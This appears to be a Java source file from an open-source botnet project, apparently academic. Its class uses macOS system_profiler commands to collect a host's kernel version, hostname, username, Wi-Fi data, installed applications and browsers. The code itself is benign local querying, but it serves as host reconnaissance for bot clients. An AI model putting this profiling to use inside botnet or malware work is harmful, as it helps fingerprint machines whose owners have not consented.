/*
  The MIT License (MIT)

  Copyright (c) 2017 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.tool.runtime;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.StringReader;
import java.util.Random;
import lombok.Data;
/**
 * This class provides methods for the detection of sys info from Mac OS X operating system 
 * @author Giacomo Marciani {@literal <gmarciani@ieee.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0.0
 * @see Random
 */
@Data
public class MacOsxSysInfoTools 
{
	/* Apple command: system_profiler -listDataTypes */

	/**
	 * Returns the kernel version of the system
	 * @return kernel Version
	 */
	public String getKernelVersion(){

		String SPSDT = RunCmdTool.runCmd("system_profiler SPSoftwareDataType");
		String kernelVersion = "";
		BufferedReader reader = new BufferedReader(new StringReader(SPSDT));
		String lines;
		try {
			while ((lines = reader.readLine()) != null)  {
				if (lines.length() > 0){
					if(lines.contains("Kernel Version:"))
						kernelVersion = lines.substring(lines.indexOf("Kernel Version: ")).replace("Kernel Version:", "");;
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		}

		return kernelVersion;		
	}
	/**
	 * Returns the name of the host
	 * @return hostname
	 */
	public String getHostName(){
		String SPSDT = RunCmdTool.runCmd("system_profiler SPSoftwareDataType");
		String hostName = "";
		BufferedReader reader = new BufferedReader(new StringReader(SPSDT));
		String lines;
		try {
			while ((lines = reader.readLine()) != null)  {
				if (lines.length() > 0){
					if(lines.contains("Computer Name:"))
						hostName = lines.substring(lines.indexOf("Computer Name: ")).replace("Computer Name:", "");
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
		return hostName;
	}

	/**
	 * Returns the username of the active user on the system
	 * @return username
	 * @throws IOException 
	 */
	public String getUserName(){
		String SPSDT = RunCmdTool.runCmd("system_profiler SPSoftwareDataType");
		String userName = "";
		BufferedReader reader = new BufferedReader(new StringReader(SPSDT));
		String lines;
		try {
			while ((lines = reader.readLine()) != null)  {
				if (lines.length() > 0){
					if(lines.contains("User Name:"))
						userName = lines.substring(lines.indexOf("User Name: ")).replace("User Name:", "");
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
		return userName;
	}

	/**
	 * Returns info of the network it is connected to the system
	 * @return network info
	 */
	public String getNetworkData(){
		return RunCmdTool.runCmd("system_profiler SPAirPortDataType");
	}

	/**
	 * Returns the list of applications installed on the system
	 * @return applications list
	 */
	public String getApplications(){
		return RunCmdTool.runCmd("system_profiler SPApplicationsDataType");
	}

	/**
	 * Returns the local connections of the system
	 * @return local connections list
	 */
	public String getNetworkLocations(){
		return RunCmdTool.runCmd("system_profiler SPNetworkLocationDataType");
	}

	/**
	 * Returns the list of browsers installed on the system
	 * @return browsers list
	 */
	public String getBrowsers(){
		String app = RunCmdTool.runCmd("system_profiler SPApplicationsDataType");
		String browsers = "";

		if(app.contains("Chrome.app"))
			browsers +=" Google Chrome ";
		if(app.contains("Safari.app"))
			browsers +=" Safari ";
		if(app.contains("Mozilla.app"))
			browsers +=" Mozilla-Firefox ";
		if(app.contains("Opera.app"))
			browsers +=" Opera ";

		return browsers;
	}	
}